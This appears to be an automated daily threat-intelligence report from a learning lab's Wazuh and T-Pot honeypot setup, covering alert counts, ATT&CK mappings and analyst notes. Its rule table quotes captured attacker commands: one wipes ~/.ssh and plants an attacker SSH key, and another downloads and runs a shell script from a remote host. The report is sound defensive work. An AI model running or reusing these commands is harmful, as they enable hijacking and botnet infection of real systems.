# LearningLab01 Daily Threat Intelligence Report — 2026-09-20

Generated: 2026-09-20T13:15:05.112Z

Report window: 2026-09-19T13:15:05.044Z through 2026-09-20T13:15:05.044Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 166,638 |
| Attack-related alerts | 31,047 |
| Honeypot interactions | 125,704 |
| Authentication failures | 18,766 |
| Authentication successes | 706 |
| Critical alerts | 150 |
| High alerts | 753 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 150 critical-severity alerts require priority review.
- 753 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 26.58:1.
- Country attribution currently covers only 1.98% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (70,235 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 150 | 0.09% |
| High | 753 | 0.45% |
| Medium | 2,091 | 1.25% |
| Low | 163,644 | 98.20% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 18,766
- Authentication successes: 706
- Failure-to-success ratio: 26.58:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Authentication failure | 18,766 | 60.44% |
| Network attack | 9,540 | 30.73% |
| Payload delivery | 9,540 | 30.73% |
| Command execution | 1,546 | 4.98% |
| Reconnaissance | 315 | 1.01% |
| Network scan | 161 | 0.52% |
| Malware | 137 | 0.44% |
| Web attack | 132 | 0.43% |
| SMTP attack | 8 | 0.03% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 3,301 alerts, representing 1.98% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 163,337 | 98.02% | Not geolocated |
| New Zealand | 2,824 | 1.69% | ████████████████████ |
| United Kingdom | 198 | 0.12% | █ |
| United States | 144 | 0.09% | █ |
| South Korea | 20 | 0.01% | █ |
| Romania | 15 | 0.01% | █ |
| Hong Kong | 12 | 0.01% | █ |
| Turkey | 10 | 0.01% | █ |
| Canada | 9 | 0.01% | █ |
| Netherlands | 9 | 0.01% | █ |
| Germany | 8 | 0.00% | █ |
| China | 7 | 0.00% | █ |
| Austria | 6 | 0.00% | █ |
| Russia | 6 | 0.00% | █ |
| Singapore | 6 | 0.00% | █ |
| Sweden | 6 | 0.00% | █ |
| Hungary | 4 | 0.00% | █ |
| Azerbaijan | 3 | 0.00% | █ |
| France | 3 | 0.00% | █ |
| Iran | 3 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 297 |
| Defense Evasion | 287 |
| Persistence | 285 |
| Privilege Escalation | 285 |
| Credential Access | 151 |
| Lateral Movement | 95 |
| Impact | 76 |
| Execution | 30 |
| Command and Control | 20 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 285 |
| Brute Force | 151 |
| Remote Services | 95 |
| Stored Data Manipulation | 76 |
| Command and Scripting Interpreter | 30 |
| Ingress Tool Transfer | 20 |
| Exploit Public-Facing Application | 12 |
| Disable or Modify Tools | 2 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 70,235 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (70,235) |
| 110213 | 4 | 26,229 | T-Pot RDP connection from [IP address] to port 3389. | tpot (26,229) |
| 110101 | 3 | 19,159 | Cowrie SSH connection from [IP address]. | tpot (19,159) |
| 110102 | 5 | 18,766 | Cowrie failed login from [IP address] using username root. | tpot (18,766) |
| 110205 | 6 | 9,486 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,486) |
| 110207 | 5 | 7,714 | T-Pot SentryPeer SIP activity from [IP address]:7850, method ACK | tpot (7,714) |
| 110204 | 4 | 7,619 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (7,619) |
| 110219 | 4 | 3,119 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (3,119) |
| 110104 | 7 | 1,382 | Cowrie captured a command from [IP address]: ls /home; /bin/busybox BOTNET | tpot (1,382) |
| 110201 | 4 | 511 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (511) |
| 110103 | 10 | 421 | Cowrie accepted login from [IP address] using username system. | tpot (421) |
| 5501 | 3 | 190 | PAM: Login session opened. | tpot (188), wazuh (2) |
| 533 | 7 | 182 | Listened ports status (netstat) changed (new port opened or closed). | tpot (180), wazuh (2) |
| 5502 | 3 | 164 | PAM: Login session closed. | tpot (162), wazuh (2) |
| 110214 | 9 | 154 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (154) |
| 110106 | 10 | 151 | Cowrie detected repeated failed logins from [IP address]. | tpot (151) |
| 110109 | 13 | 138 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (138) |
| 110215 | 4 | 134 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (134) |
| 110223 | 5 | 132 | T-Pot HoneyAML received  request from  to  on port . | tpot (132) |
| 110221 | 7 | 124 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (124) |
| 110105 | 12 | 99 | Cowrie captured a file download from [IP address]. | tpot (99) |
| 5715 | 3 | 95 | sshd: authentication success. | tpot (94), wazuh (1) |
| 110216 | 4 | 79 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (79) |
| 110220 | 8 | 65 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (65) |
| 510 | 7 | 61 | Host-based anomaly detection event (rootcheck). | wazuh (60), tpot (1) |
| 110212 | 10 | 54 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (54) |
| 550 | 7 | 54 | Integrity checksum changed. | tpot (41), wazuh (13) |
| 592 | 8 | 22 | Log file size reduced. | tpot (22) |
| 110108 | 12 | 18 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (18) |
| 110208 | 7 | 15 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:13762 | tpot (15) |
| 110225 | 13 | 12 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (12) |
| 110107 | 12 | 8 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (8) |
| 110217 | 7 | 8 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (8) |
| 110211 | 9 | 7 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (7) |
| 110222 | 9 | 5 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (5) |
| 203 | 9 | 5 | Agent event queue is full. Events may be lost. | tpot (5) |
| 202 | 7 | 4 | Agent event queue is 90% full. | tpot (4) |
| 205 | 3 | 4 | Agent event queue is back to normal load. | tpot (4) |
| 110226 | 10 | 2 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 503 | 3 | 2 | Wazuh agent started. | tpot (2) |
| 506 | 3 | 2 | Wazuh agent stopped. | tpot (2) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 502 | 3 | 1 | Wazuh server started. | wazuh (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
